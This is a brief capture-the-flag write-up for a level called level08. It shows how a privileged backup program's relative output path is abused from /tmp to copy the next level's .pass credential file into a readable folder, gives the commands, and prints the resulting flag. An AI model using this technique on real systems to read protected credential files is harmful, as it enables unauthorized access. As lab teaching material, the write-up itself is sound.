We have an executable that asks for a filename as parameter.
It first opens a file ./backups/log (exit if fail)
It opens the file and then proceeds to store the result in a backup file it creates.
It tries to create a file in ./backups/ + path of initial file

If any of these open fail it exits.
We just need to make sure the program has access to the expected folder structure

As it creates a relative path, we can execute the program from anywhere and it will create the file were we are.

We can then cd into /tmp to make sure we have the necessary rights.

```
cd /tmp
mkdir -p /tmp/backups/home/users/level09/
~/level08 /home/users/level09/.pass
cat /tmp/backups/home/users/level09/.pass
```

Flag

```
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
